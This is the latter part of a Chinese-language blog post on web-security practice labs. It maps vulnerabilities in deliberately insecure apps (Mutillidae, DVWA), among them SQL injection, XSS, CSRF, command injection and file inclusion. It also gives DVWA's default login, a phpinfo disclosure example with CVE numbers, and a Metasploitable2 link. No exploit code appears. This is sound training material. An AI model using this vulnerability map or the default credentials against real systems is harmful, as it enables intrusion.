+<p><a target="_blank" rel="noopener" href="https://community.rapid7.com/servlet/JiveServlet/showImage/2139/mutillidae-tutorial.png"><img src="/blog.github.io/images/29351400425315.png" alt="mutillidae-tutorial.png"></a></p>
+<p>Mutillidae 包含至少以下可被攻击的漏洞</p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>Page</strong></th>
+<th align="left"><strong>Vulnerabilities</strong></th>
+<th align="left"></th>
+<th align="left"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">add-to-your-blog.php</td>
+<td align="left">SQL Injection on blog entry   SQL Injection on logged in user name   Cross site scripting on blog entry   Cross site scripting on logged in user name   Log injection on logged in user name   CSRF   JavaScript validation bypass   XSS in the form title via logged in username   The show-hints cookie can be changed by user to enable hints even though they are not suppose to show in secure mode</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">arbitrary-file-inclusion.php</td>
+<td align="left">System file compromise   Load any page from any site</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">browser-info.php</td>
+<td align="left">XSS via referer HTTP header JS Injection via referer HTTP header XSS via user-agent string HTTP header</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">capture-data.php</td>
+<td align="left">XSS via any GET, POST, or Cookie</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">captured-data.php</td>
+<td align="left">XSS via any GET, POST, or Cookie</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">config.inc*</td>
+<td align="left">Contains unencrytped database credentials</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">credits.php</td>
+<td align="left">Unvalidated Redirects and Forwards</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">dns-lookup.php</td>
+<td align="left">Cross site scripting on the host/ip field O/S Command injection on the host/ip field This page writes to the log. SQLi and XSS on the log are possible GET for POST is possible because only reading POSTed variables is not enforced.</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">footer.php*</td>
+<td align="left">Cross site scripting via the HTTP_USER_AGENT HTTP header.</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">framing.php</td>
+<td align="left">Click-jacking</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">header.php*</td>
+<td align="left">XSS via logged in user name and signature The Setup/reset the DB menu item canbe enabled by setting the uid value of the cookie to 1</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">html5-storage.php</td>
+<td align="left">DOM injection on the add-key error message because the key entered is output into the error message without being encoded</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">index.php*</td>
+<td align="left">You can XSS the hints-enabled output in the menu because it takes input from the hints-enabled cookie value. You can SQL injection the UID cookie value because it is used to do a lookup You can change your rank to admin by altering the UID value HTTP Response Splitting via the logged in user name because it is used to create an HTTP Header This page is responsible for cache-control but fails to do so This page allows the X-Powered-By HTTP header HTML comments There are secret pages that if browsed to will redirect user to the phpinfo.php page. This can be done via brute forcing</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">log-visit.php</td>
+<td align="left">SQL injection and XSS via referer HTTP header SQL injection and XSS via user-agent string</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">login.php</td>
+<td align="left">Authentication bypass SQL injection via the username field and password field SQL injection via the username field and password field XSS via username field JavaScript validation bypass</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">password-generator.php</td>
+<td align="left">JavaScript injection</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">pen-test-tool-lookup.php</td>
+<td align="left">JSON injection</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">phpinfo.php</td>
+<td align="left">This page gives away the PHP server configuration Application path disclosure Platform path disclosure</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">process-commands.php</td>
+<td align="left">Creates cookies but does not make them HTML only</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">process-login-attempt.php</td>
+<td align="left">Same as login.php. This is the action page.</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">redirectandlog.php</td>
+<td align="left">Same as credits.php. This is the action page</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">register.php</td>
+<td align="left">SQL injection and XSS via the username, signature and password field</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">rene-magritte.php</td>
+<td align="left">Click-jacking</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">robots.txt</td>
+<td align="left">Contains directories that are supposed to be private</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">secret-administrative-pages.php</td>
+<td align="left">This page gives hints about how to discover the server configuration</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">set-background-color.php</td>
+<td align="left">Cascading style sheet injection and XSS via the color field</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">show-log.php</td>
+<td align="left">Denial of Service if you fill up the log XSS via the hostname, client IP, browser HTTP header, Referer HTTP header, and date fields</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">site-footer-xss-discusson.php</td>
+<td align="left">XSS via the user agent string HTTP header</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">source-viewer.php</td>
+<td align="left">Loading of any arbitrary file including operating system files.</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">text-file-viewer.php</td>
+<td align="left">Loading of any arbitrary web page on the Interet or locally including the sites password files. Phishing</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">user-info.php</td>
+<td align="left">SQL injection to dump all usernames and passwords via the username field or the password field XSS via any of the displayed fields. Inject the XSS on the register.php page. XSS via the username field</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">user-poll.php</td>
+<td align="left">Parameter pollution GET for POST XSS via the choice parameter Cross site request forgery to force user choice</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">view-someones-blog.php</td>
+<td align="left">XSS via any of the displayed fields. They are input on the add to your blog page.</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<p><strong>易被攻击的web服务：DVWA</strong></p>
+<p>从DVWA主页可以看到：“该死的容易被攻击的web应用（DVWA）的架构为PHP/MySQ。其主要目标是要帮助安全专业人员来测试他们的技能和工具在法律允许的情况下，</p>
+<p>帮助web开发人员更好地了解保护web应用程序的过程和作为课堂演示。</p>
+<p>Default username = admin<br>Default password = password</p>
+<p><a target="_blank" rel="noopener" href="https://community.rapid7.com/servlet/JiveServlet/showImage/2140/dvwa.png"><img src="/blog.github.io/images/98591400425318.png" alt="dvwa.png"></a></p>
+<p><strong><em>*易被攻击的web服务：**Information Disclosure**</em>*</strong>**<br>**</p>
+<p>另外,不恰当的PHP信息披露也可以在<a target="_blank" rel="noopener" href="http://phpinfo.ph/">http:///phpinfo.ph</a>p找到。在这个例子里，链接地址为<a target="_blank" rel="noopener" href="http://192.168.56.101/phpinfo.php%E3%80%82PHP">http://192.168.56.101/phpinfo.php。PHP</a> 信息泄露提供了内部系统的信息和服务可以用来查找安全漏洞的版本信息。举个例子，注意到在截图中披露的 PHP 的版本是 5.2.4，可能存在可以利用的漏洞，有可能系统存在CVE–2012-1823和 CVE–2012-2311，影响PHP 5.3.12 和 5.4.x 前 5.4.2 之前的版本。</p>
+<p><a target="_blank" rel="noopener" href="https://community.rapid7.com/servlet/JiveServlet/showImage/102-1875-12-2136/phpinfo.png"><img src="/blog.github.io/images/64181400425320.png" alt="phpinfo.png"></a></p>
+<p><strong>metasploitable2下载址：</strong><a target="_blank" rel="noopener" href="http://sourceforge.net/projects/metasploitable/files/Metasploitable2">http://sourceforge.net/projects/metasploitable/files/Metasploitable2</a></p>
+<p>[原文地址：<a target="_blank" rel="noopener" href="https://community.rapid7.com/docs/DOC-1875%E7%89%88%E6%9D%83%E5%BD%92%E5%8E%9F%E4%BD%9C%E8%80%85%E6%89%80%E6%9C%89%EF%BC%8C%E4%BB%85%E4%BE%9B%E5%AD%A6%E4%B9%A0%E4%BA%A4%E6%B5%81%E4%B9%8B%E7%94%A8]">https://community.rapid7.com/docs/DOC-1875版权归原作者所有，仅供学习交流之用]</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/blog.github.io/tags/%E9%83%A8%E7%BD%B2/" rel="tag"><i class="fa fa-tag"></i> 部署</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog.github.io/2020/03/29/%E7%8E%AF%E5%A2%83-%E5%B7%A5%E5%85%B7-git%E5%AD%A6%E4%B9%A0/" rel="next" title="git学习">
+                <i class="fa fa-chevron-left"></i> git学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog.github.io/2020/03/30/%E5%BE%85%E6%95%B4%E7%90%86%E5%AD%A6%E4%B9%A0/" rel="prev" title="待整理学习">
+                待整理学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/blog.github.io/images/avatar.gif"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <!-- <a href="/blog.github.io/archives/%7C%7C%20archive"> -->
+				<a href="/blog.github.io/archives">
+              
+                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/blog.github.io/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/blog.github.io/tags/index.html">
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web%E5%AE%89%E5%85%A8%E5%9C%A8%E7%BA%BF%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0"><span class="nav-number">1.</span> <span class="nav-text">Web安全在线练习平台</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-DVWA"><span class="nav-number">1.1.</span> <span class="nav-text">1.DVWA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-OWASP-Bricks"><span class="nav-number">1.2.</span> <span class="nav-text">2.OWASP Bricks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-WebGoat"><span class="nav-number">1.3.</span> <span class="nav-text">3.WebGoat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-SQLi-Labs"><span class="nav-number">1.4.</span> <span class="nav-text">4.SQLi-Labs</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A6%BB%E7%BA%BF%E9%9D%B6%E6%9C%BA"><span class="nav-number">2.</span> <span class="nav-text">离线靶机</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Metasploitable2"><span class="nav-number">2.1.</span> <span class="nav-text">Metasploitable2</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">magic</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/blog.github.io/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog.github.io/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog.github.io/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog.github.io/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog.github.io/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog.github.io/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog.github.io/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/blog.github.io/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/blog.github.io/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/blog.github.io/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/blog.github.io/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/blog.github.io/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/blog.github.io/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/blog.github.io/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
